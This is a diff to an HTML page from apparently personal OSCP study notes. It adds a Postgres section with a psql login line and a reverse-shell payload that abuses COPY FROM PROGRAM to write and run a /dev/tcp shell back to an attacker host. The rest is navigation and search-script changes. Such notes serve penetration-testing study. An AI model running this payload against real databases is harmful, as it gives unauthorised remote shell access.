@@ -3,12 +3,13 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>AD Notes - OSCP</title>
+    <title>Web Fuzzing - AD Notes</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
+    <!-- NAVBAR -->
     <nav>
         <a href="index.html">Home</a>
 
@@ -41,7 +42,7 @@
                     </div>
                 </div>
 
-                 <div class="dropdown-sub">
+                <div class="dropdown-sub">
                     <a href="#">Attacks ▾</a>
 
                     <div class="dropdown-subcontent">
@@ -70,7 +71,7 @@
                     </div>
                 </div>
 
-                 <div class="dropdown-sub">
+                <div class="dropdown-sub">
                     <a href="#">Password cracking ▾</a>
 
                     <div class="dropdown-subcontent">
@@ -99,31 +100,107 @@
         <a href="file-transfer.html">File Transfer</a>
         <a href="checklist.html">Checklist</a>
         <a href="pivoting.html">Pivoting</a>
-        <a href="recon.html">Recon</a>
-        <a href="qol.html">QOL</a>
-        <a href="toolsCheatsheet.html">Tools Cheatsheet</a>
-        <a href="files.html">Files Searching</a>
         <a href="tips.html">Tips</a>
-        <a href="general.html">General</a>
     </nav>
     <div class="search-bar">
         <input type="text" id="global-search" placeholder="Buscar..." />
-        <button onclick="performSearch()">🔍 Buscar</button>
-        <div id="search-results" class="search-results"></div>
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
     </div>
-    <div class="container">
-        <h1>Active Directory Notes</h1>
-        <p>
-            Personal notes for OSCP / ASD focused on Active Directory attacks.
-        </p>
+    <!-- CONTENT -->
 
-        <ul>
-            <li>Enumeration</li>
-            <li>Attacking</li>
-            <li>Lateral Movement</li>
-            <li>Real Examples</li>
-        </ul>
+    <div class="container">
+
+        <h1>General</h1>
+
+        <div class="section">
+            <div class="section-header">Postgres</div>
+            <div class="section-content">
+
+                <p><strong>If we have access to a postgres database</strong></p>
+                <pre><code>psql -h &lt;IP&gt; -p &lt;Port&gt; -U &lt;User&gt;</code></pre>
+
+                <p><strong>Revershell</strong></p>
+                <pre><code>
+CREATE TABLE shell(output text);
+
+COPY shell FROM PROGRAM 'echo "sh -i >& /dev/tcp/&lt;AttackerIP&gt;/&lt;AttackerPort&gt; 0>&1" > /tmp/poo2.sh';
+
+COPY shell FROM PROGRAM '/bin/bash /tmp/poo2.sh';
+                </code></pre>
+            </div>
+        </div>
+
+
+
     </div>
+    <!-- SCRIPT -->
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        });
+        function toggleSearchResults() {
+            const results = document.getElementById("search-results");
+            const toggleBtn = document.getElementById("toggle-results");
+
+            results.classList.toggle("collapsed");
+
+            if (results.classList.contains("collapsed")) {
+                toggleBtn.textContent = "▼";
+            } else {
+                toggleBtn.textContent = "▲";
+            }
+        }
+
+        function performSearch() {
+            const query = document.getElementById("global-search").value.toLowerCase();
+            const resultsContainer = document.getElementById("search-results");
+            resultsContainer.innerHTML = "";
+
+            if (!query) {
+                resultsContainer.classList.add("collapsed");
+                return;
+            }
+
+            const allElements = Array.from(document.body.querySelectorAll("*"))
+                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+            if (allElements.length === 0) {
+                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+            } else {
+                allElements.forEach((el, idx) => {
+                    let container = el.closest(".section, .sub-section") || el;
+
+                    if (!container.id) {
+                        container.id = `search-target-${idx}`;
+                    }
+
+                    const div = document.createElement("div");
+                    div.textContent = el.textContent;
+                    div.style.cursor = "pointer";
+                    div.style.padding = "5px 10px";
+                    div.style.borderBottom = "1px solid #1e293b";
+                    div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                    div.onmouseout = () => div.style.backgroundColor = "";
+                    div.onclick = () => {
+                        if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                            container.classList.add("active");
+                        }
+
+                        container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                        container.classList.add("highlight-fade");
+                        setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                    };
+
+                    resultsContainer.appendChild(div);
+                });
+            }
+
+            resultsContainer.classList.remove("collapsed");
+        }
+    </script>
 
 </body>
 
